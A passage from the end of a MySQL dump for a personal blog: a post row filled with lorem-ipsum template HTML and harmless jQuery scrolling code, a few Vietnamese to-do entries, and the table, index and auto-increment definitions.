-->\r\n                                \r\n                                  \r\n                                   \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. Cras vel tempus velit, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodale Sed posuere nisi ipsum.</p>\r\n                                   \r\n                                  \r\n                                  \r\n                                  <!-- Post Blockquote Start -->\r\n                                  <div class="post-quote margin-top-40 margin-bottom-40">\r\n                                    <blockquote>Design is not just what is look like, Design is how it\'s work.</blockquote>\r\n                                  </div>\r\n                                  <!-- Post Blockquote End -->\r\n                                  \r\n                                  \r\n                                   \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. Cras vel tempus velit, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodale Sed posuere nisi ipsum.</p>\r\n                                   \r\n                                 \r\n                                  \r\n                                  <!-- Post Coding (SyntaxHighlighter) Start -->\r\n                                  <div class="margin-top-40 margin-bottom-40">  \r\n                                   <pre class="brush: js">\r\n                                   /* Smooth Scroll */\r\n\r\n                                    $(\'a.smoth-scroll\').on("click", function (e) {\r\n                                      var anchor = $(this);\r\n                                      $(\'html, body\').stop().animate({\r\n                                      scrollTop: $(anchor.attr(\'href\')).offset().top - 50\r\n                                      }, 1000);\r\n                                      e.preventDefault();\r\n                                     });\r\n         \r\n                                   /* Scroll To Top */\r\n    \r\n                                   $(window).scroll(function(){\r\n                                     if ($(this).scrollTop() >= 500) {\r\n                                     $(\'.scroll-to-top\').fadeIn();\r\n                                     } else {\r\n                                     $(\'.scroll-to-top\').fadeOut();\r\n                                     }\r\n                                     });\r\n  \r\n                                 $(\'.scroll-to-top\').click(function(){\r\n                                   $(\'html, body\').animate({scrollTop : 0},800);\r\n                                   return false;\r\n                                    });\r\n                                  </pre>\r\n                                 </div>\r\n                                 <!-- Post Coding (SyntaxHighlighter) End -->\r\n                                 \r\n                                  \r\n                                  \r\n                                  <div class="post-title">\r\n                                    <h2>How to implement?</h2> \r\n                                   </div>\r\n                                   \r\n                                   \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. Cras vel tempus velit, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodale Sed posuere nisi ipsum.</p>\r\n                                   \r\n                                     \r\n                                  \r\n                                  \r\n                                  <!-- Post Image Gallery Start -->\r\n                                  <div class="row margin-top-40 margin-bottom-40">\r\n                                 \r\n                                    <div class="col-md-4 col-sm-6 col-xs-12">\r\n                                      <a href="https://huynv.site/public/images/blog/7.jpg" class="image-popup" title="image Title">\r\n                                      <img src="https://huynv.site/public/images/blog/7.jpg" class="img-responsive" alt="">\r\n                                     </a>\r\n                                    </div>\r\n                    \r\n                                    <div class="col-md-4 col-sm-6 col-xs-12">\r\n                                      <a href="https://huynv.site/public/images/blog/5.jpg" class="image-popup" title="image Title">\r\n                                      <img src="https://huynv.site/public/images/blog/5.jpg" class="img-responsive" alt="">\r\n                                     </a>\r\n                                    </div>\r\n                    \r\n                                   <div class="col-md-4 col-sm-6 col-xs-12">\r\n                                     <a href="https://huynv.site/public/images/blog/6.jpg" class="image-popup" title="image Title">\r\n                                     <img src="https://huynv.site/public/images/blog/6.jpg" class="img-responsive" alt="">\r\n                                    </a>\r\n                                   </div>\r\n                                \r\n                                 </div>\r\n                                 <!-- Post Image Gallery End -->\r\n                                 \r\n                                \r\n                                \r\n                                  <div class="post-title">\r\n                                    <h2>Make it more awesome</h2> \r\n                                   </div>\r\n                                   \r\n                                   \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est.</p>\r\n                                 \r\n                                   \r\n                                  \r\n                                  <!-- Post Blockquote (Italic Style) Start -->\r\n                                  <blockquote class="margin-top-40 margin-bottom-40">\r\n                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. Cras vel tempus velit, <b>et accumsan nisi</b>. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodale Sed posuere nisi ipsum.</p>\r\n                                   </blockquote>\r\n                                   <!-- Post Blockquote (Italic Style) End -->\r\n                                   \r\n                                   \r\n                                  \r\n                                  \r\n                                  <div class="post-title">\r\n                                    <h2>Learn to check all the features</h2> \r\n                                   </div>\r\n                                   \r\n                                   \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est.</p>\r\n                                 \r\n                                   \r\n                                  \r\n                                  <!-- Post List Style Start -->\r\n                                  <div class="list">\r\n                                   <ul>\r\n                                     <li>Ready to use Blog Template</li>\r\n                                     <li>It have all the necessary features which you need to run blog</li>\r\n                                     <li>Neat and Clean Typography</li>\r\n                                     <li>Speed Optimization</li>\r\n                                    </ul>\r\n                                   </div>\r\n                                   \r\n                                   \r\n                                  <div class="list list-style margin-top-40">\r\n                                   <ul>\r\n                                     <li>Ready to use Blog Template</li>\r\n                                     <li>It have all the necessary features which you need to run blog</li>\r\n                                     <li>Neat and Clean Typography</li>\r\n                                     <li>Speed Optimization</li>\r\n                                    </ul>\r\n                                   </div>\r\n                                   \r\n                                   \r\n                                  <div class="list list-style-2 margin-top-40">\r\n                                   <ul>\r\n                                     <li>Ready to use Blog Template</li>\r\n                                     <li>It have all the necessary features which you need to run blog</li>\r\n                                     <li>Neat and Clean Typography</li>\r\n                                     <li>Speed Optimization</li>\r\n                                    </ul>\r\n                                   </div>\r\n                                   <!-- Post List Style End -->', 'https://huynv.site/17', 0);

-- --------------------------------------------------------

--
-- Table structure for table `post_tag`
--

CREATE TABLE `post_tag` (
  `id_post` int(11) NOT NULL,
  `id_tag` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tags_list`
--

CREATE TABLE `tags_list` (
  `id` int(11) NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `work_hard_everytime`
--

CREATE TABLE `work_hard_everytime` (
  `id` int(11) NOT NULL,
  `content` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `done` tinyint(1) NOT NULL DEFAULT '0',
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `work_hard_everytime`
--

INSERT INTO `work_hard_everytime` (`id`, `content`, `date`, `done`, `created`) VALUES
(1, 'Hoàn thành Plan controller trong Myblog', '2018-03-01', 1, '2018-03-01 10:50:33'),
(2, 'Gọi anh Chuyển bàn giao, và tìm hiểu dự án Email ở Lakita', '2018-03-01', 1, '2018-03-01 10:51:31'),
(3, 'làm giao diện Admin quản trị ask cho Myblog', '2018-03-02', 1, '2018-03-02 01:05:32'),
(4, 'Tìm hiểu Push Notification áp dụng cho ask', '2018-03-02', 0, '2018-03-02 03:59:20');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `asks`
--
ALTER TABLE `asks`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `emails`
--
ALTER TABLE `emails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `me`
--
ALTER TABLE `me`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `post_tag`
--
ALTER TABLE `post_tag`
  ADD PRIMARY KEY (`id_post`,`id_tag`);

--
-- Indexes for table `tags_list`
--
ALTER TABLE `tags_list`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `work_hard_everytime`
--
ALTER TABLE `work_hard_everytime`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT for table `asks`
--
ALTER TABLE `asks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;
--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
--
-- AUTO_INCREMENT for table `emails`
--
ALTER TABLE `emails`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `me`
--
ALTER TABLE `me`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;
--
-- AUTO_INCREMENT for table `tags_list`
--
ALTER TABLE `tags_list`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `work_hard_everytime`
--
ALTER TABLE `work_hard_everytime`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
